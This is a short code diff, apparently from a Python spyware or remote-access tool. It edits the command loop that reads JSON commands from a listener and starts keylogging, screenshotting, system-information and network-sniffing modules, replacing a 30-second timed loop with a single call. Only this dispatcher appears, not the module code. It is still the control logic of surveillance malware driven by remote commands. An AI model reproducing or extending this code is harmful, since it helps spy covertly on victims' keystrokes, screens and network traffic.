@@ -35,8 +35,6 @@ def mod_sniffer():
     s.start_sniffing()
 
 def start_program():
-    time_period = 30
-    #start_time = time.time()
     json_commands = command_listener()
     decoded_commands = json.loads(json_commands)
     for command in decoded_commands["commands"]:
@@ -48,21 +46,15 @@ def start_program():
                 print("Ended keylogging")
             case 'screenshot':                            
                 print("Started screenshotting")
-                start_time = time.time()
-                while time.time() - start_time < time_period:
-                    mod_screenshotter()
+                mod_screenshotter()
                 print("Stopped screenshotting")
             case 'sysinfo':
                 print("Started the sysinfo")
-                start_time = time.time()
-                while time.time() - start_time < time_period:
-                    mod_sysinfo()
+                mod_sysinfo()
                 print("Stopped the sysinfo")
             case 'sniffer':
                 print("Started sniffing")
-                start_time = time.time()
-                while time.time() - start_time < time_period:
-                    mod_sniffer()
+                mod_sniffer()
                 print("Stopped sniffing")
 
 while True:
